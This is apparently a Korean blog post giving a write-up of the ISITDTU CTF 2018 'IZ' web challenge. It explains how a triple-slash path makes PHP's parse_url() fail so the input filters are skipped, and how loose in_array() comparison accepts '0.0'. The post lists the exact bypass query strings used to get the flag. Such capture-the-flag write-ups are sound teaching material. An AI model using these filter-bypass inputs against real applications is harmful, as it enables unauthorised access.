---
layout: post
title: ! "[ISITDTU] IZ write up"
categories: [CTF]
excerpt: " "
comments: true
share: true
tags:
  - ISITDTU
  - CTF
  - write-up
  - IZ
---

## ISITDTU CTF 2018 Quals 100포인트 문제 IZ write up

```php
<?php 

include "config.php"; 
$number1 = rand(1,100000000000000); 
$number2 = rand(1,100000000000); 
$number3 = rand(1,100000000); 
$url = urldecode($_SERVER['REQUEST_URI']); 
$url = parse_url($url, PHP_URL_QUERY); 
if (preg_match("/_/i", $url))  
{ 
    die("..."); 
} 
if (preg_match("/0/i", $url))  
{ 
    die("..."); 
} 
if (preg_match("/\w+/i", $url))  
{ 
    die("..."); 
}     
if(isset($_GET['_']) && !empty($_GET['_'])) 
{ 
    $control = $_GET['_'];         
    if(!in_array($control, array(0,$number1))) 
    { 
        die("fail1"); 
    } 
    if(!in_array($control, array(0,$number2))) 
    { 
        die("fail2"); 
    } 
    if(!in_array($control, array(0,$number3))) 
    { 
        die("fail3"); 
    } 
    echo $flag; 
} 
show_source(__FILE__); 
?>
```

소스코드가 주어지는 문제이며 PHP encoding과 관련된 문제인 것 같다.
필터링에 걸리면 다음과 같이 ...가 뜨면서 종료된다.
![]({{ site.baseurl }}/assets/posts/ctf/isitdtu/iz_die.png)

parse_url()을 사용하는데 php 매뉴얼에서 parse_url()에 대한 주의사항이 존재한다.
```
1. 이 함수는 상대 URL에는 작동하지 않습니다.
2. 이 함수는 URI가 아닌, URL을 해석하는 목적으로 만들어졌습니다. 그러나, PHP 하위 호환에 따라서 세개의 슬래시가 나오는 file:/// 스킴(file:///...)을 허용합니다. 다른 종류의 이러한 스킴은 유효하지 않습니다.
```

parse_url()은 http:// 로 시작하는 절대 url 구문을 분석하는 함수인데
$url 변수에 사용된 $_SERVER['REQUEST_URI'] 는 / 로 시작하는 경로를 반환한다.
 
```php
mitny@ubuntu:~$ php -a
Interactive mode enabled

php > var (parse_url("/test.php?key=value"));
PHP Parse error:  syntax error, unexpected 'var' (T_VAR), expecting end of file in php shell code on line 1
php > var_dump (parse_url("/test.php?key=value"));
array(2) {
  ["path"]=>
  string(9) "/test.php"
  ["query"]=>
  string(9) "key=value"
}
php > var_dump (parse_url("//test.php?key=value"));
array(2) {
  ["host"]=>
  string(8) "test.php"
  ["query"]=>
  string(9) "key=value"
}
php > var_dump (parse_url("///test.php?key=value"));
bool(false)
```

이런 식으로 / 세 개를 parse_url()에 전달하면 false가 반환된다.
문제 url에 `http://35.185.178.212///?_=0` 이렇게 해주면 _가 존재함에도 ...이 뜨지 않는다.

![]({{ site.baseurl }}/assets/posts/ctf/isitdtu/iz_false.png)

_이 존재하므로 이제 다음 !in_array($control, array(0,$number1)) 부분 조건문을 통과해야 하는데
_ 매개변수가 0이나 랜덤하게 생성되는 숫자 $number1, $number2, $number3와 일치해야 한다. 
난수보다는 0을 시도해보는게 나을 것 같다.

다른 숫자를 넣어보면 fail이 뜬다.
![]({{ site.baseurl }}/assets/posts/ctf/isitdtu/iz_fail.png)

in_array()가 정수 소수를 구분하지 않고 요소를 검사해주기 때문에 다음과 같은 결과가 나온다.
```
php > var_dump(in_array(0,array(0.0)));
bool(true)
```
그래서
`//?_=0.0`과 같이 0.0을 매개변수로 전달해주면 플래그가 뜨게 된다.
![]({{ site.baseurl }}/assets/posts/ctf/isitdtu/iz_0flag.png)

`//?_=a`, `?%23&_=a`로도 플래그를 얻을 수 있다.
